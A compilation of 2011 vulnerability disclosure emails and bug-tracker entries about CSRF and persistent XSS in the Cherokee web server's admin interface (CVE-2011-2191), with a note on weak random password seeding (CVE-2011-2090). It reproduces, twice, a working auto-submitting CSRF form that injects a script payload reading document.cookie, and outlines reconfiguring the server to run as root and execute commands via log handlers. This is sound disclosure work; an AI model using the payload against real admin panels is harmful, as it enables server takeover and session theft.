Subject: CVE Request -- Cherokee -- server admin vulnerable to csrf

Hello, Josh, Steve, vendors,

   this doesn't seem to have a CVE identifier yet:
   [1] <http://seclists.org/fulldisclosure/2011/Jun/0>

Though not sure, how much probable it is, it would get fixed,
since upstream looks to consider this not to be an issue.

Thanks && Regards, Jan.

Subject: Security issue in cherokee

A security bug was reported against cherokee in Ubuntu. You are being
emailed as the upstream contact. Please keep oss-security[1] CC'd for
any updates on this issue.

This issue should be considered public, but has not yet been assigned a
CVE. Once a CVE is assigned, please mention it in any changelogs.

Details from the public bug follow:
<https://launchpad.net/bugs/784632>

From the reporter:
----
The cherokee admin server is vulnerable to csrf.

Using csrf it is possible to produce a persistent xss in several pages -
including the 'status' page via the 'nickname field' of a vserver.
An example of this is the following:

<html>
<body>
 <form action="http://127.0.0.1:9090/vserver/apply" method="post"
id="xssform">
 <input type="text" name="tmp!new_droot" value='/var/www/'></input>
 <input type="text" name="tmp!new_nick" value='" onselect=alert(1)
autofocus> <embed src="javascript:alert(document.cookie)">'></input>
</form>
<script>document.getElementById("xssform").submit();</script>
</body>

A Worst case scenario could be something like the following:
If a user is logged in and the cherokee admin server is running on
localhost:9090 then if they visit a $bad page - the bad page may be able
to send requests to the server so as to reconfigure it to:

1. run as root
2. the logging of error(or access) will run a command ...
----

Thanks in advance for your cooperation in coordinating a fix for this
issue,

| [Description](show_bug.cgi?id=713304#c0)  Vincent Danen    2011-06-14 22:25:21 UTC  ``` Two flaws were reported in Cherokee.  The first ([CVE-2011-2191](https://access.redhat.com/security/cve/CVE-2011-2191)) is that the Cherokee server admin configuration web interface is vulnerable to CSRF.  If an admin is logged into the Cherokee admin interface and visits a site which runs a malicious script, Cherokee can be reconfigured to execute arbitrary commands [1].  It is also vulnerable to use the CSRF to produce a persistant XSS [2].  The second ([CVE-2011-2090](https://access.redhat.com/security/cve/CVE-2011-2090)) is that Cherokee seeds srand with a combination of the time and the PID of the admin process, after which rand() is called to generate a random password -- this is unsafe and allows for fairly easy local password guessing by a local user [3].

These updated packages have been pushed to -testing repository, and upon their required testing is complete, they will be pushed to -stable repository.   ```  [Comment 5](show_bug.cgi?id=713304#c5)  Gunnar Wolf    2012-03-09 16:22:19 UTC  ``` This bug consists of two separate issues. AFAICT, the second one has been dealt with, but the first one is still open.  I am not really familiar with RedHat's workflow, but at least I have been unable to find anything fixing the CSRF bug, short of this mail sent by the upstream author, stating he has not found a way to solve it:    <http://www.openwall.com/lists/oss-security/2011/06/06/13>   ``` |  |

# cherokee server admin vulnerable to csrf

---

*From*: dave b <db.pub.mail () gmail com>

*Date*: Wed, 1 Jun 2011 19:07:16 +1000

```
Vendor response: "This isn't an issue."

Problem: the cherokee server admin configuration web interface is
vulnerable to csrf.

Impact: if an admin is logged into the cherokee admin interface and
visits a site which runs "bad tm scripts" cherokee can be reconfigured
to run as $user and set log handlers(hooks) to execute arbitrary
commands (on error and on access).

# csrf & xss issue (resulting from csrf).

Bug #784632 reported by
[David](https://launchpad.net/~d--)
on 2011-05-18

[258](/%2Bhelp-bugs/bug-heat.html)

This bug affects 1 person

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [cherokee (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/cherokee "Latest release: 1.2.101-1, uploaded to main on 2011-10-27 09:21:11.416574+00:00 by Gunnar Wolf (gwolf), maintained by Gunnar Wolf (gwolf)") | Confirmed | Undecided | Unassigned |  |

### Bug Description

Binary package hint: cherokee

The cherokee admin server is vulnerable to csrf.

Using csrf it is possible to produce a persistent xss in several pages - including the 'status' page via the 'nickname field' of a vserver.

An example of this is the following:

<html>

<body>

 <form action="<http://127.0.0.1:9090/vserver/apply>" method="post" id="xssform">

 <input type="text" name="tmp!new\_droot" value='/var/www/'></input>

 <input type="text" name="tmp!new\_nick" value='" onselect=alert(1) autofocus> <embed src="javascript:alert(document.cookie)">'></input>

</form>

<script>document.getElementById("xssform").submit();</script>

</body>

A Worst case scenario could be something like the following:

If a user is logged in and the cherokee admin server is running on localhost:9090 then if they visit a $bad page - the bad page may be able to send requests to the server so as to reconfigure it to:

1. run as root

2. the logging of error(or access) will run a command ...
